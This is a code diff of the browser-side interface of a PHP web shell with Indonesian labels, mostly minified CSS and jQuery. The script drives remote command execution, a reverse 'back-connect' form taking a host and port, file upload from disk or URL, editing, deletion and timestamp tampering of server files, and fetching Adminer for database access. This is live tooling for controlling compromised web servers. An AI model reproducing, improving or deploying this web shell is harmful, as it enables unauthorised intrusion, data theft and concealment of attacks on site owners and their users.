rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"Upload";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}.toast.show{margin-top:40px!important}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important;transition:font-size .3s ease-in}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important;transition:font-size .3s ease-in}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}	</style>
+		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0, 212, 51;--bs-danger-rgb:220, 53, 69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace;transition:font-size .3s ease-in}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:4rem;color:#ddd;transition:font-size .3s ease-in}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input,textarea,select{font-size:1em!important;transition:all .3s ease-in;outline:none}input:focus,textarea:focus,select:focus{box-shadow:none!important}nav .nav-tabs{border-bottom:1px solid #00a6c0}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(0,0,0,3%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table tfoot th{padding:5px 10px!important;background:rgb(var(--bs-success-rgb),20%);border-top:2px solid var(--bg-success)!important;border-bottom:0 solid #eee!important}table tbody tr td:last-child{padding-right:0}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}table tfoot tr th:first-child{border-bottom-left-radius:.25rem}table tfoot tr th:last-child{border-bottom-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:background .3s ease-in}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.table-responsive{border-radius:.5em}.fixed_listdbtable tbody{display:inline-grid;overflow:auto;max-height:260px;height:100%;width:100%;border-bottom:1px solid var(--success)!important}.breadcrumb{background:linear-gradient(170deg,rgb(var(--bs-success-rgb),20%),transparent);padding:4px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre{font-size:1em;border:0!important;color:#cfdce8!important;transition:font-size .3s ease-in;height:auto;max-height:500px}.form-control-sm{height:auto}select:disabled,textarea:disabled{background-color:#272c31!important}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .75em 0 0}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}select,textarea{background-color:#343a40!important;color:#cfdce8!important}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"Upload";color:var(--success);background:#2b2f34}.custom-control-label::before{background-color:#343a40;border:2px solid var(--success)}.custom-control-input:checked~.custom-control-label::before{border-color:var(--success);background-color:var(--success)}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}.toast.show{margin-top:40px!important}.spinner-icon{display:inline-block;margin-right:.5em;height:1.5em;width:1.5em;background-image:url('data:image/svg+xml,<?php echo rawurlencode(fType('loader'));?>');background-repeat:no-repeat;background-size:contain;transform-origin:center;animation:spinners .75s infinite linear}@keyframes spinners{100%{transform:rotate(360deg)}}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important;transition:font-size .3s ease-in}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important;transition:font-size .3s ease-in}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
 	</head>
 	<body>
 		<header class="header bg-dark fixed-top mt-auto py-1">
@@ -1233,9 +2001,12 @@ if(!isset($_SESSION['auth'])){
 				</blockquote>
 			</div>
 		</footer>
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.bundle.min.js" integrity="sha512-igl8WEUuas9k5dtnhKqyyld6TzzRjvMqLC79jkgT3z02FvJyHAuUtyemm/P/jYSne1xwFI06ezQxEwweaiV7VA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-		<script type="text/javascript">!function(t){var e='<div class="mb-3 bg-transparent"><?php echo fType('loader','1.5em');?>Tunggu bentar...</div>';let a={bs64ToBit:function(t){let e=atob(t);return Uint8Array.from(e,t=>t.codePointAt(0))},btTobs64:function(t){let e=String.fromCodePoint(...t);return btoa(e)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(e){return!1}},encode:function(t){return a.isWellFormed(t)?a.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return a.isWellFormed(t)?new TextDecoder().decode(a.bs64ToBit(t)):""}},n=(e,a)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="5000"><div class="toast-header"><img src="<?php echo fType('logo');?>" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+e+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+a+"</div></div>"),t(".toast").toast("show")};function o(a,o,r,i){var d=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+o+"&entry="+r+"&opt="+a,beforeSend:function(){d.html(e)}}).done(function(t){d.html(""),i(t)}).fail(function(t,e,a){n("Error",t.status),d.html("error_code: "+t.status)})}function r(e){for(var a=0;a<e.length;a++)e[a].addEventListener("change",function(e){var a=t("option:selected",this)[0],r=a.value,i=t("#modalshowaksi"),d="",l="",s="",m=a.attributes["data-xtype"],u=a.attributes["data-xname"],c=a.attributes["data-xpath"],f=e.currentTarget;if(r.length>0){switch(i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),r){case"rename":l="Rename "+m.value.toUpperCase()+" /"+u.value,d='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+c.value+'"/><input type="hidden" name="oname" value="'+u.value+'"/><div class="form-group row mb-0"><label for="xname" class="col-sm-2 col-form-label">'+("dir"==m.value?"Directory":"File")+'</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+u.value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s="";break;case"touch":l="Touch "+m.value.toUpperCase()+" /"+u.value,d='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+c.value+'"/><input type="hidden" name="xname" value="'+u.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+a.attributes["data-xtime"].value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s=""}if("download"==r)window.open("?act=path&dir="+c.value+"&entry="+u.value+"&opt="+r,"_blank");else if("del"==r||"zip"==r||"unzip"==r)i.modal("show"),i.find(".modal-title").html(r+" /"+u.value),i.find(".modal-body").html('<form method="post" action="?act='+r+'" id="rq'+r+'" class="text-center"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xname" value="'+u.value+'"/><input type="hidden" name="xpath" value="'+c.value+'"/><div class="alert alert-info mt-n3 mx-n3 rounded-0">Klik proses utk melanjutkan!!</div><button class="btn btn-success" type="submit">Proses!</button></form>'),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").html("null"),f.value=""});else if("edit"==r){i.modal("show"),i.find(".modal-body").addClass("p-0"),i.find(".modal-title").html("Edit "+m.value.toUpperCase()+": /"+u.value);var p=i.find(".modal-content").html();o("edit",c.value,u.value,function(t){i.find(".modal-body").html('<textarea name="xdata" class="form-control rounded-0" style="white-space:pre;background:#2b2f34;" rows="30">'+t+"</textarea>"),i.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>'),setTimeout(()=>i.find(".modal-body textarea").focus(),300),i.find(".modal-content").html('<form method="post" action="?act=path&dir='+c.value+"&entry="+u.value+'&opt=edit" id="rqeditfile">'+i.find(".modal-content").html()+"</form>")}),i.on("hidden.bs.modal",function(t){i.find(".modal-content").html(p),i.find(".modal-title").html("unknown"),i.find(".modal-body").removeClass("p-0").html("null"),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),f.value=""})}else"view"==r?(i.modal("show"),i.find(".modal-title").html("View "+m.value.toUpperCase()+": /"+u.value),o("view",c.value,u.value,function(t){i.find(".modal-body").attr("style","background:#2b2f34;").addClass("rounded-0").html('<pre class="mb-0">'+t+"</pre>"),i.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>')}),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").attr("style","").removeClass("rounded-0").html("null"),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),f.value=""})):(i.modal("show"),i.find(".modal-title").html(l),i.find(".modal-body").html(d),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").html("null"),f.value=""}))}else n("Error","Invalid request!")},!1)}function i(o,r){t.ajax({type:"get",url:"?act=path&dir="+o,timeout:5e3,beforeSend:function(){t("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(e,n,i){t("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),r(e)}).fail(function(e,a,r){t("#fileman").html(a+", response code: "+e.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),n("Error",a+", response code: "+e.status)})}t(document).on("click","a#chdrive",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){r(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(e){e.preventDefault();var a=t(e.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+a+'" autofocus></input>							<div class="input-group-append">								<button class="btn btn-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){r(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(e){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(e){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(e){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(e){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(a){var n=t("#nav-info").find("#showinfo");t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t(n).html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e)),o=t.map(a,function(t,e){return[t]});t(n).html('<blockquote class="blockquote px-3 pt-n3 pb-3 bg-success-rgb rounded">'+o.join("")+"</blockquote>")}catch(r){t(n).html("Error: Gagal menganalisa server!")}})}),t('button[data-target="#nav-sql"]').on("shown.bs.tab",function(a){var n=t("#nav-sql").find("#showsqlframe");t.ajax({type:"get",url:"?act=getpma",dataType:"json",beforeSend:function(){t(n).html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e));!1==a.error?(window.open(a.message,"_blank").focus(),t(n).html("<blockquote class='blockquote text-center px-3 py-2 mt-2 bg-success-rgb rounded'><div class='d-block text-cyan'>Sukses</div><span class='text-light' style='color:#cfdce8!important;font-size:.8em;'>Adminer berhasil dibuat!. Jika sudah selesai ubek2 databasenya, jangan lupa menghapusnya dengan cara..<br/><button type='button' class='btn btn-outline-warning btn-sm' id='removepma'>KLIK DISINI</button></span></blockquote>")):t(n).html("<blockquote class='blockquote text-center px-3 py-2 mt-2 bg-success-rgb rounded'><span class='text-cyan'>"+a.message+"<footer class='blockquote-footer' style='color:#cfdce8!important;font-size:.8em;'>Gak bisa ambil source adminer</footer></blockquote>")}catch(o){t(n).html("<blockquote class='blockquote text-center px-3 py-2 mt-2 bg-success-rgb rounded'><span class='text-cyan'>Error: Gak bisa ambil source adminer!</span></blockquote>")}})}),t(document).on("click","button#removepma",function(a){var n=t("#nav-sql").find("#showsqlframe");t.ajax({type:"get",url:"?act=getpma&del",dataType:"json",beforeSend:function(){t(n).html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e));t(n).html("<blockquote class='blockquote text-center px-3 py-2 mt-2 bg-success-rgb rounded'><span class='text-light' style='color:#cfdce8!important;font-size:.8em;'>"+a.message+"</span></blockquote>")}catch(o){t(n).html("<blockquote class='blockquote text-center px-3 py-2 mt-2 bg-success-rgb rounded'><span class='text-cyan'>Error: Gagal menghapus file!</span></blockquote>")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(e){e.stopPropagation(),i(t(this).attr("data-path"),function(){r(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(e){e.stopPropagation(),i(t(this).attr("data-path"),function(){r(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(e){var a=t(e.relatedTarget),n=t(this).find(".modal-body"),o=a.attr("data-xtype"),r=a.attr("data-xname"),i=a.attr("data-xpath"),d=a.attr("data-xperm");n.find('input[name="xtype"]').val(o),n.find('input[name="xname"]').val(r),n.find('input[name="xpath"]').val(i),n.find('input[name="xperm"]').val(d).focus(),n.find('input[id="xname"]').val(r),n.find('label[for="xname"]').css("text-transform","capitalize").html("dir"==o?"Directory":"File")}),t.each(["rqdel","rqzip","rqunzip","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile","rqbc"],function(o,r){t(document).on("submit","form#"+r,function(o){o.preventDefault();var i=t(this),d=t("#modalshowaksi");if(i.find('button[type="submit"]').prop("disabled",!0),"rqrename"==r||"rqtouch"==r)i.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==r||"rqnewfile"==r)var l=a.encode(i.find('textarea[name="xdata"]').val());else if("rqbc"==r){var s=i.find('input[name="bhost"]').val(),m=i.find('input[name="bport"]').val();if(i.find('input[name="btype"]').val(),t("body").find("#showbc").remove(),s.length<=0||m.length<=0)return n("Opss!","Server dan port gak boleh dikosongin!"),i.find('button[type="submit"]').prop("disabled",!1),!1}else if("rqreadfile"==r){var u=i.find('input[name="xpath"]').val();if(u.length<1)return n("Opss!","Isi dulu nama filenya pak!"),!1;d.modal("show"),d.find(".modal-title").html("View FILE: "+u),i.find('button[type="submit"]').prop("disabled",!1)}t.ajax({type:"post",url:i.attr("action"),data:"rqeditfile"==r||"rqnewfile"==r?{xdata:l}:i.serialize(),beforeSend:function(){t("rqbc"==r?'<div class="row" id="showbc"><div class="col-12 mb-3">'+e+"</div></div>":e).insertAfter(i)}}).done(function(e){i.parent().find("div.bg-transparent").remove(),i.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==r?(d.find(".modal-body").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"),d.find(".modal-footer").html("")):"rqbc"==r?t("#showbc div").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"):("rqrename"==r||"rqtouch"==r?i.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==r&&t("body").find("#showchmod").modal("hide"),d.modal("hide"),n("Alert",e));var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})})})}),t(document).on("submit","form#rqchdir",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xpath"]').val();o.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(a.find('button[type="submit"]').prop("disabled",!0),i(o,function(){var t=document.querySelectorAll("#showaksi");t.length>0?r(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),a.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(a){a.preventDefault();var o=t(this),r=o.find('input[name="xdir"]').val();if(r.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==o.find(":selected").val()){var i=t("#modalshowaksi"),d=o.find('input[name="xpath"]').val();i.modal("show"),i.find(".modal-title").text("FileName: "+r),i.find(".modal-body").html('<form method="post" action="?act=path&dir='+d+"&entry="+r+'&opt=newfile" id="rqnewfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control" style="white-space:pre;color:#000!important;" rows="20" placeholder="tulis seperlunya..." autofocus></textarea></div><center><button class="btn btn-success text-center" type="submit">Simpan</button></center></form>')}else o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)},success:function(e){o.next("span").remove(),o.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()}),o.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t(document).on("click","div#uploadmethod",function(e){e.preventDefault(),t(this).find("select#xtype").on("change",function(){var e=t(this).find(":selected").val();t("file"==e?"#uploadtypefile":"#uploadtypeurl").modal("show")})}),t(document).on("submit","form#rquploader",function(a){a.preventDefault();var o=t(this);o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)}}).done(function(e){o[0].reset(),o.parent().find("div.bg-transparent").remove(),o.find('button[type="submit"]').prop("disabled",!1),t("#uploadtypeurl").modal("hide"),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})})}),t("form#rqupload").find('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xfile[]"]').prop("files");if(o&&o.length<=0||o.size<1)n("Error","File kosong, gak ada isinya!");else{var r=new FormData(this);a.find('button[type="submit"]').prop("disabled",!0),r.append("xfile",o),t.ajax({type:"post",url:a.attr("action"),data:r,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){a.next("span").remove()},success:function(e){a[0].reset(),a.next("span").remove(),a.find('button[type="submit"]').prop("disabled",!1),n("Alert",e),t("#uploadtypefile").modal("hide");var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(n){n.preventDefault();var o=t(this);o.parents().find("#hasilcommand").show(),o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),dataType:"json",beforeSend:function(){o.parents().find("#hasilcommand").html(e)},success:function(t){var e=JSON.parse(JSON.stringify(t));o.find('input[name="xpath"]').val(a.decode(e.path)),o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.decode(e.stdout)+"</div></div>")},error:function(t,e,a){o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+e+": "+a+"</div></div>")}}).done(function(e){var n=JSON.parse(JSON.stringify(e));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile,form#rqbc").find('input[name="xpath"]').val(a.decode(n.path)),t("div#uploadmethod").attr("data-xpath",a.decode(n.path)),t.each(t("button[data-tempdir]"),function(e,o){t(o).attr("data-tempdir",a.decode(n.path))}),t.each(t("a#fxmanager"),function(e,o){t(o).attr("data-path",a.decode(n.path))})})}),t(document).on("hidden.bs.modal",function(){t(".container").attr("style","filter: blur(0px);")}),t(document).on("show.bs.modal",function(){t(".container").attr("style","filter: blur(2px);")})}(jQuery);</script>
+		<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
+		<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha256-GRJrh0oydT1CwS36bBeJK/2TggpaUQC6GzTaTQdZm0k=" crossorigin="anonymous"></script>		
+		<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.37.1/src-min/ace.js" integrity="sha256-j0T2ePXwSG4TgRsN7jKuuvUMRDcSJc997KCJSv9/TNk=" crossorigin="anonymous"></script>
+		<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.37.1/src-min/mode-php.js" integrity="sha256-3rHEdQQv0mscER3N8IrS1V3jZzlk45R1Uu8UIQqf6uE=" crossorigin="anonymous"></script>
+		<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.37.1/src-min/theme-monokai.js" integrity="sha256-2KFkudTravG9kVvHM2WLJvWzr90TX+DGc6T2QxoG1k8=" crossorigin="anonymous"></script>
+		<script type="text/javascript">!function(t){let e='<div class="mb-3 bg-transparent d-flex"><div class="spinner-icon"></div>Tunggu bentar...</div>',a={bs64ToBit:function(t){let e=atob(t);return Uint8Array.from(e,t=>t.codePointAt(0))},btTobs64:function(t){let e=String.fromCodePoint(...t);return btoa(e)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(e){return!1}},encode:function(t){return a.isWellFormed(t)?a.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return a.isWellFormed(t)?new TextDecoder().decode(a.bs64ToBit(t)):""}},n=(e,a)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="5000"><div class="toast-header"><img src="<?php echo fType('logo');?>" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+e+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+a+"</div></div>"),t(".toast").toast("show")};function o(t){try{return JSON.parse(t)&&!!t}catch(e){return!1}}function i(e,a){let n='<table class="table table-sm w-100 mb-0"><thead class="bg-dark text-light"><tr>';return a.forEach(t=>{n+='<th class="pl-2">'+t+"</th>"}),n+="</tr></thead><tbody>",e.forEach(t=>{n+="<tr>",a.forEach(e=>{let a="-";if(void 0!==t[e]&&""!=t[e]){var o;a=null!=(o=t[e])?o.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;").replace(/\n/g,"<br/>"):null}n+='<td class="pl-2">'+a+"</td>"}),n+="</tr>"}),t(n+="</tbody></table>")}function d(a,o,i,d){var s=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+o+"&entry="+i+"&opt="+a,beforeSend:function(){s.html(e)}}).done(function(t){s.html(""),d(t)}).fail(function(t,e,a){n("Error",t.status),s.html("error_code: "+t.status)})}function s(e){for(var a=0;a<e.length;a++)e[a].addEventListener("change",function(e){var a=t("option:selected",this)[0],o=a.value,i=t("#modalshowaksi"),s="",l="",r="",m=a.attributes["data-xtype"],c=a.attributes["data-xname"],u=a.attributes["data-xpath"],p=e.currentTarget;if(o.length>0){switch(i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),o){case"rename":l="Rename "+m.value.toUpperCase()+" /"+c.value,s='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><input type="hidden" name="oname" value="'+c.value+'"/><div class="form-group row mb-0"><label for="xname" class="col-sm-2 col-form-label">'+("dir"==m.value?"Directory":"File")+'</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+c.value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',r="";break;case"touch":l="Touch "+m.value.toUpperCase()+" /"+c.value,s='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><input type="hidden" name="xname" value="'+c.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+a.attributes["data-xtime"].value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',r="";break;case"copy":l="Copy "+m.value.toUpperCase()+" /"+c.value,s='<form method="post" action="?act=copy" id="rqcopy">										<input type="hidden" name="xtype" value="'+m.value+'"/>										<input type="hidden" name="xpath" value="'+u.value+'"/>										<input type="hidden" name="xname" value="'+c.value+'"/>										<div class="form-group mb-0">											<label for="xtarget" class="form-label">Paste to:</label>											<div class="input-group mb-3">												<input type="text" class="form-control border-success" id="xtarget" name="xtarget" value="'+u.value+'" autofocus=""/>												<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>											</div>										</div>									</form>',r="";break;case"cut":l="Cut "+m.value.toUpperCase()+" /"+c.value,s='<form method="post" action="?act=cut" id="rqcut">										<input type="hidden" name="xtype" 